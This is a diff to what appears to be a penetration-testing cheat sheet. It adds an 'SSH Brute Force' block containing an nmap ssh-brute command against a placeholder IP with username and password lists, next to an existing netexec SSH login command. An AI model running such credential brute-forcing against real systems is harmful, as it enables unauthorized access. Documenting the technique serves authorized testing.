@@ -75,6 +75,12 @@ netexec ssh <IP> -u <USER> -p 'password'
 ```
 {% endcode %}
 
+{% code title="SSH Brute Force" overflow="wrap" %}
+```sh
+nmap -n -p22 --script ssh-brute --script-args userdb=usernames.txt,passdb=passwords.txt <IP>
+```
+{% endcode %}
+
 </details>
 
 <details>
